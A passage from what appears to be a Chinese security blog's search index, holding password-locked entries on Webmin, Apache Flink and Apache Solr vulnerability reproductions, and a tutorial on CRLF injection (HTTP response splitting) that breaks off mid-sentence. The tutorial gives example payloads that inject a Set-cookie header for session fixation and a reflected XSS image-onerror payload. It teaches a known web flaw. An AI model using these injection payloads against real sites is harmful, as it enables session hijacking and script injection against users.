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
</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Webmin</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Flink 任意 Jar 包上传致 RCE 漏洞复现</title>
    <url>/2019/11/17/Apache-Flink-%E4%BB%BB%E6%84%8F-Jar-%E5%8C%85%E4%B8%8A%E4%BC%A0%E8%87%B4-RCE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">

</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Apache Flink</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Solr系列漏洞复现</title>
    <url>/2019/11/15/Apache-Solr%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">

</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Apache Solr</tag>
      </tags>
  </entry>
  <entry>
    <title>CRLF漏洞</title>
    <url>/2019/11/09/CRLF%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="CRLF背景"><a href="#CRLF背景" class="headerlink" title="CRLF背景"></a>CRLF背景</h3><p>CRLF是”回车 + 换行”（\r\n）的简称，指的是<strong>回车符</strong>(CR，ASCII 13，\r，%0d) 和<strong>换行符</strong>(LF，ASCII 10，\n，%0a)。 在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS(HTTP相应拆分漏洞）</p>
<h3 id="CRLF举例"><a href="#CRLF举例" class="headerlink" title="CRLF举例"></a>CRLF举例</h3><p>一般网站会在HTTP头中用Location: <a href="http://xxx.com这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址。" target="_blank" rel="noopener">http://xxx.com这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址。</a></p>
<p>正常的302跳转包如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Moved Temporarily</span><br><span class="line"><span class="built_in">Date</span>: Fri, <span class="number">27</span> Jun <span class="number">2019</span> <span class="number">17</span>:<span class="number">52</span>:<span class="number">17</span> GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: <span class="number">154</span></span><br><span class="line">Connection: close</span><br><span class="line">Location: http:<span class="comment">//www.lsowl.top</span></span><br></pre></td></tr></table></figure>
<p>如果输入的是</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//www.lsowl.top%0aSet-cookie:JSPSESSID%3Dtest</span></span><br></pre></td></tr></table></figure>
<p>注入了一个换行，此时的返回包就会变成这样： </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Moved Temporarily</span><br><span class="line"><span class="built_in">Date</span>: Fri, <span class="number">27</span> Jun <span class="number">2019</span> <span class="number">17</span>:<span class="number">52</span>:<span class="number">17</span> GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: <span class="number">154</span></span><br><span class="line">Connection: close</span><br><span class="line">Location: http:<span class="comment">//www.lsowl.top</span></span><br><span class="line"><span class="built_in">Set</span>-cookie: JSPSESSID=test</span><br></pre></td></tr></table></figure>
<p>此时就会产生会话固定漏洞， HRS并不仅限于会话固定，通过注入两个CRLF就能造成一个无视浏览器Filter的反射型XSS。</p>
<p>例如：一个网站进行URL跳转的参数链接如下 <a href="http://www.lsowl.top/?url=xxx，xxx放在Location后面作为一个跳转。如果我们输入的是" target="_blank" rel="noopener">http://www.lsowl.top/?url=xxx，xxx放在Location后面作为一个跳转。如果我们输入的是</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//www.lsowl.top/?url=%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;</span></span><br></pre></td></tr></table></figure>
<p>返回包会变成如下的样子</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Moved Temporarily</span><br><span class="line"><span class="built_in">Date</span>: Fri, <span class="number">27</span> Jun <span class="number">2019</span> <span class="number">17</span>:<span class="number">52</span>:<span class="number">17</span> GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: <span class="number">154</span></span><br><span class="line">Connection: close</span><br><span class="line">Location:</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=alert(<span class="regexp">/xss/</span>)&gt;</span><br></pre></td></tr></table></figure>
<p>这样浏览器会根据第一个 CRLF把HTTP包分成头和体，然后将体显示出来就会构造成一个XSS</p>
<p>还可以输入</p>
